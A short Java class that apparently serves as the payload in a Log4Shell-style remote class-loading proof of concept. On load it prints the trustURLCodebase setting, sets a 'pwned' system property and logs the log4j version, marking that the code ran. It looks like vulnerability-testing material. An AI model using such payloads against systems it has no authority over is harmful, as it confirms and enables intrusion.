package itzbenz.payload;

import org.apache.logging.log4j.LogManager;

public class General {
    static boolean init = false;

    static {
        init();
    }

    public static void init() {
        if (init) return;
        init = true;
        boolean trustURL = Boolean.parseBoolean(System.getProperty("com.sun.jndi.ldap.object.trustURLCodebase"));
        System.out.println("com.sun.jndi.ldap.object.trustURLCodebase: " + trustURL);
        if (System.getProperty("pwned") == null) {
            System.setProperty("pwned", "true");
        }
        try {

            String version = org.apache.logging.log4j.core.lookup.JavaLookup.class.getPackage()
                    .getImplementationVersion();
            System.err.println("Using log4j version: " + version);
            LogManager.getLogger().error("Using log4j version: " + version);
        } catch (Throwable ignored) {
        }
        System.err.println("Great Success!");
    }
}
